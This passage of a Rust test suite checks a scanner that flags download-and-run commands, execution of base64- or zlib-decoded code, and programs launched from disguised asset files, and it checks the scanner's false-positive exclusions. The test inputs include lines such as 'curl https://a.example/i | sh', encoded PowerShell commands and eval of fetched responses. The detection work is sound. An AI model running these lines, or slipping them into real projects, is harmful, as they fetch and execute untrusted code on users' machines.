            "await import(`https://${host}.example.com/a.js`)",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{line}");
        }
    }

    #[test]
    fn finds_indirect_ways_to_run_text() {
        for line in [
            "fetch(u); (0, eval)(code);",
            "fetch(u); [].constructor.constructor(code)();",
            "fetch(u); window['eval'](code);",
            "Function(r.data)()",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(!report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn finds_python_that_hides_its_imports() {
        let line = "exec(__import__('zlib').decompress(b'x'))";
        let report = scan_text("a.py", line.as_bytes());

        assert!(!report.listed(Kind::RunsHiddenCode).is_empty());
    }

    #[test]
    fn finds_the_answer_to_a_request_being_run_with_no_request_in_sight() {
        for line in [
            "eval(rs_L.data.cookie)",
            "eval(err.response.data)",
            "eval(result.data)",
            "eval(await res.text())",
            "new Function(r.body)()",
            "vm.runInThisContext(x.data)",
            "exec(r.content)",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{line}");
        }
    }

    #[test]
    fn parts_of_the_page_are_not_the_answer_to_a_request() {
        for line in [
            "var xss = 'javascript:eval(document.body.innerHTML)';",
            "eval(window.data)",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn finds_code_that_runs_what_it_decodes() {
        for line in [
            "eval(atob('aGk='))",
            "eval(Buffer.from(x, 'base64').toString())",
            "new Function(atob(x))()",
            "exec(base64.b64decode(blob))",
            "eval(base64_decode($x));",
            "eval(gzinflate(base64_decode($x)));",
            "exec(zlib.decompress(blob))",
            "exec(marshal.loads(blob))",
            "echo aGk= | base64 -d | sh",
            "echo aGk= | base64 --decode | bash",
            "powershell -enc SQBFAFgAIAAoAEkA",
            "powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAEkA",
            "require(atob('Y2hpbGRfcHJvY2Vzcw=='))",
            "os.system(base64.b64decode(blob))",
            "subprocess.run(base64.b64decode(blob))",
            "spawn('sh', ['-c', atob(x)])",
            "assert(base64_decode($x));",
            "[ScriptBlock]::Create([Convert]::FromBase64String($x))",
            "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(
                !report.listed(Kind::RunsHiddenCode).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn finds_commands_that_run_files_which_are_not_code() {
        for line in [
            "node public/fonts/icons.woff2",
            "node ./assets/logo.png",
            "python3 data/readme.txt",
            "bash notes.md",
            "\"postinstall\": \"node assets/a.css\"",
            "powershell -File logo.jpg",
            "eval(fs.readFileSync('./assets/logo.png', 'utf8'))",
            "new Function(fs.readFileSync(p + '/font.woff'))",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(report.listed(Kind::DisguisedFile).len(), 1, "{line}");
        }
    }

    #[test]
    fn programs_handed_a_file_to_work_on_are_fine() {
        for line in [
            "node convert.js input.txt",
            "python resize.py logo.png",
            "require('./logo.png')",
            "cat notes.md",
            "sh build.sh notes.txt",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::DisguisedFile).is_empty(), "{line}");
        }
    }

    #[test]
    fn running_text_with_no_download_or_decoding_is_not_flagged() {
        for line in [
            "eval(expression)",
            "new Function('a', 'return a + 1')",
            "exec('git status')",
            "exec(command, callback)",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
            assert!(report.listed(Kind::RunsHiddenCode).is_empty(), "{line}");
        }
    }

    #[test]
    fn method_calls_that_share_these_names_are_not_flagged() {
        for line in [
            "model.eval()\nresponse = requests.get(url)",
            "const m = /x/.exec(text); fetch(url)",
            "page.eval(x); fetch(url)",
            "new Function(\"return this\")(); fetch(url)",
        ] {
            let report = scan_text("a.py", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn running_a_fixed_string_near_a_download_is_not_flagged() {
        for line in [
            "fetch(u);\neval('1 + 1');",
            "fetch(u);\neval(\"test\")",
            "fetch(u);\nvm.runInContext('new RegExp(/a/)', ctx);",
            "fetch(u);\nexec('git rev-list --tags')",
            "fetch(u);\nexec(`git describe --tags`)",
            "fetch(u);\nnew Function('a', 'return a')",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn starting_a_program_near_a_download_is_not_running_the_download() {
        for text in [
            "await exec(`curl -L ${HEADERS} ${url} > a.zip`);",
            "fetch(u);\nawait exec(`rm -rf ${dir}`, {cwd});",
            "fetch(u);\nexec(*args.map(&:to_s))",
            "curl = 'curl -s x'\nfetch(u)\nexec(hyperfine.to_s, *args)",
            "fetch(u);\nexec(command)",
        ] {
            let report = scan_text("a.rb", text.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{text}");
        }
    }

    #[test]
    fn declaring_a_function_with_these_names_is_not_flagged() {
        for line in [
            "pub fn exec(gctx: &mut GlobalContext, args: &ArgMatches) -> CliResult { fetch(u) }",
            "def exec(self, cmd):\n  requests.get(u)",
            "function eval(code) { fetch(u) }",
            "exec(context?: Context): Promise<void>; fetch(u)",
            "eval(code: string): void; fetch(u)",
        ] {
            let report = scan_text("a.rs", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn comments_and_stack_traces_are_not_flagged() {
        for (path, text) in [
            ("a.sh", "# curl https://a.example/i | sh\n"),
            ("a.sh", "#  sh -c \"$(curl -fsSL https://a.example/i)\"\n"),
            ("a.js", "// curl https://a.example/i | sh\n"),
            ("a.ps1", "# Under `irm | iex` the script runs\n"),
            ("a.js", "fetch(u);\n// eval(code)\n"),
            ("a.js", "fetch(u);\nconst s = '\\n  at eval (a.js:3:13)';\n"),
        ] {
            let report = scan_text(path, text.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{text}");
        }
    }

    #[test]
    fn real_commands_beside_comments_still_count() {
        for text in [
            "curl https://a.example/i | sh # harmless, promise\n",
            "/* note */ curl https://a.example/i | sh\n",
        ] {
            let report = scan_text("a.sh", text.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{text}");
        }
    }

    #[test]
    fn a_download_far_away_does_not_count() {
        let padding = "// filler\n".repeat(NEARBY_LINES + 2);
        let text = format!("const r = fetch(u);\n{padding}eval(code);");
        let report = scan_text("a.js", text.as_bytes());

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn a_call_far_away_on_a_long_minified_line_does_not_count() {
        let padding = "x".repeat(NEARBY_WINDOW_BYTES * 2);
        let text = format!("fetch(u);{padding};eval(code);");
        let report = scan_text("a.min.js", text.as_bytes());

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn ci_config_and_container_builds_are_not_flagged() {
        for path in [".gitlab-ci.yml", ".github/workflows/a.yml", "Dockerfile"] {
            let report = scan_text(
                path,
                b"curl https://a.example | sh
",
            );

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{path}");
        }
    }

    #[test]
    fn documentation_and_pages_showing_a_command_are_not_flagged() {
        for path in ["README.md", "www/index.html", "notes.txt", "a.js.map"] {
            let report = scan_text(path, b"Install: curl -fsSL https://a.example | sh\n");

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{path}");
        }
    }

    #[test]
    fn binary_files_are_not_searched() {
        let report = scan_text("tool.bin", b"\0\0curl https://a.example | sh");

        assert!(report.listed(Kind::DownloadsAndRuns).is_empty());
    }

    #[test]
    fn reports_the_right_line() {
        let snippet = "curl https://a.example/i | sh";
        let report = scan_text("a.sh", format!("#!/bin/sh\n\n{snippet}\n").as_bytes());

        assert_eq!(report.first_line(Kind::DownloadsAndRuns, snippet), Some(3));
    }
}
